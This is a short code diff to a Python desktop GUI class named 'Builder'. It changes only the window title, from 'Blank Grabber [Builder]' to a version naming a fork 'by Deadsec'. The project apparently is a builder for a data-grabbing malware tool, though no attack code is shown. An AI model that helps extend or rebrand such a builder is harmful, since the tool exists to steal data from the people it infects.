@@ -380,7 +380,7 @@ class Builder(ctk.CTk):
 		super().__init__()
 
 		ctk.set_appearance_mode("dark")
-		self.title("Blank Grabber [Builder]")
+		self.title("Blank Grabber Forked By Deadsec [Builder]")
 		self.iconbitmap(os.path.join("Extras", "icon.ico"))
 		self.geometry("1250x600")
 		self.resizable(False, False)
